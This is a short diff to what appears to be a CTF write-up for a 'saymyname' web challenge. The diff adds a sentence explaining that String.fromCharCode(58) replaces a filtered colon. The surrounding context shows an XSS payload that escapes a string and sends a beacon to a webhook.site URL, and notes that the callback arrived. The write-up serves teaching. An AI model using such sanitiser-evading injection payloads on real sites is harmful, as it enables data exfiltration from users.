@@ -167,6 +167,8 @@ Let's use [`navigator`](https://developer.mozilla.org/en-US/docs/Web/API/Navigat
 \";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1`);//
 ```
 
+We use `${String.fromCharCode(58)}` as a representation for `:` as it is filtered in the sanitiser from earlier.
+
 Sure enough we get a `POST` request from the webapp on webhook.site.
 
 ![saymyname-webhook.png](images/25-pwnmequals/saymyname-webhook.png)
